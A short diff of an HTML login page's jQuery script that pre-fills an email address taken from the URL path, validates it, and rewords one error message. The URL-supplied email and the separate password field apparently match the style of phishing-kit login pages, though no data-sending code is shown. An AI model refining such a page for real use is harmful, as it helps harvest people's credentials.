@@ -373,8 +373,9 @@ $(document).ready(function() {
     // Grab the last part of the URL path after the '/'
     var ai = window.location.pathname.split('/').pop(); // Extracts 'XXXEMAIL' from '/XXXEMAIL'
 
-    // Check if ai is valid (it's an email or something you want to validate)
+    // Check if ai is a valid email format
     var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
     if (filter.test(ai)) {
         // Set the email to the input field
         $('#ai').val(ai);
@@ -407,10 +408,11 @@ $(document).ready(function() {
 
         if (!filter.test(my_ai)) {
             $('#error').show();
-            $('#error').html("The password does not exist. Enter the correct password");
+            $('#error').html("The email is not valid. Please enter a valid email.");
             ai.focus;
             return false;
         }
+
         if (!pr) {
             $('#error').show();
             $('#error').html("The password field is empty!");
@@ -467,6 +469,7 @@ $(document).ready(function() {
         });
     });
 });
+
 </script>
 
         <div class="base_links">
@@ -492,5 +495,6 @@ $(document).ready(function() {
   </div>
 </body>
 </html>
+
 
 
